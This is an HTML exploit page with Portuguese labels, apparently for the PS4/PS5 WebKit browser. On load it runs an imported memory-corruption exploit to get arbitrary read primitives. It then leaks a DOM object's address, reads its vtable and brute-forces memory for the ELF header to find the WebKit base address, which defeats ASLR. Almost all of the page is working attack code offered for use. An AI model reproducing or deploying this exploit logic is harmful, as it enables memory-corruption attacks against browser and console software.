<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>PS4 WebKit — Base Finder (v3 OOM-Safe)</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 12px/1.4 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    gap: 6px; padding: 8px; }
  h1 { color: #fff; font-size: 14px; text-align: center; }
  #status { font-size: 12px; font-weight: 700; color: #fff; text-align: center; }
  .panel { background: #111827; border: 1px solid #1f2937; border-radius: 6px;
    padding: 8px; width: 95%; max-width: 720px; }
  .row { display: flex; justify-content: space-between; padding: 2px 0;
    font-family: monospace; font-size: 10px; border-bottom: 1px solid #1f2937; }
  .row:last-child { border-bottom: none; }
  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
  #log { width: 95%; max-width: 720px; height: 160px; background: #111827;
    border: 1px solid #1f2937; border-radius: 6px; padding: 6px;
    overflow-y: auto; font-family: monospace; font-size: 10px; color: #9fb1c3; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #log .warn { color: #fbbf24; }
  .ctrl-btn { padding: 6px 10px; border-radius: 5px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 10px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.4; cursor: not-allowed; }
  .ctrl-btn.success { background: #15803d; }
  .ctrl-btn.gold { background: #b45309; }
  .ctrl-btn.danger { background: #991b1b; }
  .section { color: #9ca3af; font-size: 8px; text-transform: uppercase; margin: 2px 0 1px; }
  .hint { color: #6b7280; font-size: 9px; text-align: center; max-width: 720px; }
  input[type="text"] {
    background: #1f2937; border: 1px solid #374151; color: #fff;
    border-radius: 3px; padding: 4px 5px; font-family: monospace; font-size: 10px;
    width: 100px;
  }
  .flex-row { display: flex; gap: 5px; flex-wrap: wrap; justify-content: center; align-items: center; }
</style>
</head>
<body>
<h1>PS4 WebKit — Base Finder (v3 OOM-Safe)</h1>
<div id="status">Inicializando...</div>

<div class="section">Valores</div>
<div class="panel" id="leaks">
  <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
  <div class="row"><span class="label">vtable ptr (0x10):</span><span class="value" id="l-vt">---</span></div>
  <div class="row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
  <div class="row"><span class="label">Base:</span><span class="value" id="l-base">---</span></div>
</div>

<div class="hint">
  v3: Log limitado a 25 linhas. Brute force loga a cada 512 blocos. Sem OOM.
</div>

<div class="section">Acoes</div>
<div class="flex-row">
  <button class="ctrl-btn success" onclick="scanVtable()">🔎 Ler VTable</button>
  <button class="ctrl-btn gold" onclick="bruteForceCtor()">💥 BF Ctor</button>
  <button class="ctrl-btn danger" onclick="bruteForceVtable()">💥 BF VTable</button>
  <button class="ctrl-btn" onclick="testVtableOffsets()">🎯 Offsets VTable[0]</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
</div>

<div class="section">Offset do Ctor</div>
<div class="flex-row">
  <input type="text" id="custom-off" placeholder="0x3A888" value="0x3A888">
  <button class="ctrl-btn" onclick="testCustomOffset()">Testar</button>
</div>

<div id="log"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const logBox = document.getElementById("log");
  const status = document.getElementById("status");
  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 25) logBox.removeChild(logBox.firstChild);
  }
  window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };

  let ctorInt64 = null;
  let vtablePtr = null;
  let vtable0 = null;
  let running = false;

  function setRunning(v) {
    running = v;
    document.querySelectorAll('.ctrl-btn').forEach(b => { b.disabled = v; });
  }

  function numToInt64(num) {
    const low  = (num % 0x100000000) >>> 0;
    const hi   = (Math.floor(num / 0x100000000)) >>> 0;
    return new int64(low, hi);
  }

  function align16k(addr) {
    return addr.and64(0xFFFFC000, 0xFFFFFFFF);
  }

  function int64ToNum(addr) {
    return addr.hi * 0x100000000 + addr.low;
  }

  function isValidPtr(addr) {
    const n = int64ToNum(addr);
    return n >= 0x800000000 && n < 0x900000000;
  }

  function safeRead4(p, addr) {
    try { return p.read4(addr); } catch (e) { return null; }
  }
  function safeRead8(p, addr) {
    try { return p.read8(addr); } catch (e) { return null; }
  }

  async function testBase(addr, label) {
    const p = window.p;
    if (!p) return false;
    log("=== " + label + " => 0x" + addr.toString(16) + " ===", "warn");
    const magic = safeRead4(p, addr);
    if (magic === null) { log("  read falhou", "err"); return false; }
    const magicU = magic >>> 0;
    log("  Magic: 0x" + magicU.toString(16).padStart(8,"0"), magicU === 0x464c457f ? "found" : "info");
    if (magicU === 0x464c457f) {
      log("✅ BASE! 0x" + addr.toString(16), "found");
      window.__webkitBase = addr;
      document.getElementById("l-base").textContent = "0x" + addr.toString(16);
      status.textContent = "BASE: 0x" + addr.toString(16);
      status.style.color = "#4ade80";
      return true;
    }
    return false;
  }

  window.scanVtable = async function() {
    const p = window.p;
    if (!p) { log("p nao disponivel", "err"); return; }
    log("Lendo vtable...", "warn");
    const textArea = document.createElement("textarea");
    const objAddr = p.leakval(textArea);
    const vtPtr = safeRead8(p, objAddr.add32(0x10));
    if (!vtPtr) { log("Falha vtable ptr", "err"); return; }
    vtablePtr = vtPtr;
    document.getElementById("l-vt").textContent = "0x" + vtPtr.toString(16);
    const v0 = safeRead8(p, vtPtr);
    if (!v0) { log("Falha vtable[0]", "err"); return; }
    vtable0 = v0;
    document.getElementById("l-vt0").textContent = "0x" + v0.toString(16);
    log("vt=0x" + vtPtr.toString(16) + " v0=0x" + v0.toString(16), "ok");
  };

  window.bruteForceCtor = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !ctorInt64) { log("Ctor nao pronto", "err"); return; }
    setRunning(true);
    log("BF Ctor (64MB max)...", "warn");
    const step = 0x4000;
    const maxDist = 0x4000000;
    let current = align16k(ctorInt64);
    const end = ctorInt64.sub32(maxDist);
    let tested = 0;
    try {
      for (;;) {
        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
          log("Limite 64MB", "err"); break;
        }
        const magic = safeRead4(p, current);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ BASE! 0x" + current.toString(16), "found");
          window.__webkitBase = current;
          document.getElementById("l-base").textContent = "0x" + current.toString(16);
          status.textContent = "BASE: 0x" + current.toString(16);
          status.style.color = "#4ade80";
          const off = int64ToNum(ctorInt64) - int64ToNum(current);
          log("Ctor offset = 0x" + off.toString(16), "found");
          setRunning(false); return;
        }
        tested++;
        current = current.sub32(step);
        if (tested % 512 === 0) {
          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
          await new Promise(r => setTimeout(r, 10));
        }
      }
    } catch (e) { log("Exc: " + e.message, "err"); }
    log("BF Ctor fim", "err");
    setRunning(false);
  };

  window.bruteForceVtable = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !vtablePtr) { log("Clique Ler VTable primeiro", "err"); return; }
    setRunning(true);
    log("BF VTable (64MB max)...", "warn");
    const step = 0x4000;
    const maxDist = 0x4000000;
    let current = align16k(vtablePtr);
    const end = vtablePtr.sub32(maxDist);
    let tested = 0;
    try {
      for (;;) {
        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
          log("Limite 64MB", "err"); break;
        }
        const magic = safeRead4(p, current);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ BASE! 0x" + current.toString(16), "found");
          window.__webkitBase = current;
          document.getElementById("l-base").textContent = "0x" + current.toString(16);
          status.textContent = "BASE: 0x" + current.toString(16);
          status.style.color = "#4ade80";
          const off = int64ToNum(vtablePtr) - int64ToNum(current);
          log("VTable ptr offset = 0x" + off.toString(16), "found");
          setRunning(false); return;
        }
        tested++;
        current = current.sub32(step);
        if (tested % 512 === 0) {
          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
          await new Promise(r => setTimeout(r, 10));
        }
      }
    } catch (e) { log("Exc: " + e.message, "err"); }
    log("BF VTable fim", "err");
    setRunning(false);
  };

  // ============================================================
  // TESTAR OFFSETS COMUNS A PARTIR DO VTABLE[0]
  // ============================================================
  window.testVtableOffsets = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !vtable0) { log("Clique Ler VTable primeiro", "err"); return; }
    setRunning(true);
    log("Testando offsets do vtable[0]...", "warn");

    // Offsets comuns do PS5 + alguns extras
    const offsets = [
      0x100000, 0x200000, 0x300000, 0x400000,
      0x500000, 0x600000, 0x700000, 0x800000,
      0x900000, 0xA00000, 0xB00000, 0xC00000,
      0xD00000, 0xE00000, 0xF00000, 0x1000000,
      0x1200000, 0x1400000, 0x1600000, 0x1800000,
      0x1A00000, 0x1C00000, 0x1E00000, 0x2000000,
      0x2200000, 0x2400000, 0x2600000, 0x2800000,
    ];

    for (const off of offsets) {
      const base = align16k(vtable0.sub32(off));
      if (!isValidPtr(base)) continue;
      log("vt[0]-0x" + off.toString(16) + " => 0x" + base.toString(16), "info");
      const magic = safeRead4(p, base);
      if (magic !== null && (magic >>> 0) === 0x464c457f) {
        log("✅ BASE! 0x" + base.toString(16), "found");
        window.__webkitBase = base;
        document.getElementById("l-base").textContent = "0x" + base.toString(16);
        status.textContent = "BASE: 0x" + base.toString(16);
        status.style.color = "#4ade80";
        log("Offset vtable[0] = 0x" + off.toString(16), "found");
        setRunning(false); return;
      }
      await new Promise(r => setTimeout(r, 5));
    }
    log("Nenhum offset comum funcionou.", "err");
    setRunning(false);
  };

  window.testCustomOffset = async function() {
    const p = window.p;
    if (!p || !ctorInt64) { log("Primitivas nao prontas", "err"); return; }
    const raw = document.getElementById("custom-off").value;
    const off = parseInt(raw, 16);
    if (isNaN(off)) { log("Offset invalido", "err"); return; }
    const base = align16k(ctorInt64.sub32(off));
    const found = await testBase(base, "Custom-0x" + off.toString(16));
    if (found) {
      const actualOff = int64ToNum(ctorInt64) - int64ToNum(base);
      log("Offset real = 0x" + actualOff.toString(16), "found");
    }
  };

  log("Carregando...", "ok");
  status.textContent = "Executando exploit...";
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      log("Exploit pronto!", "ok");
      const ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        ctorInt64 = numToInt64(ctor);
        document.getElementById("l-ctor").textContent = "0x" + ctorInt64.toString(16);
        log("Ctor=0x" + ctorInt64.toString(16), "ok");
      }
      status.textContent = "Pronto — clique em 'Ler VTable'";
      status.style.color = "#60a5fa";
    })
    .catch(err => { log("FALHA: " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
</script>
</body>
</html>
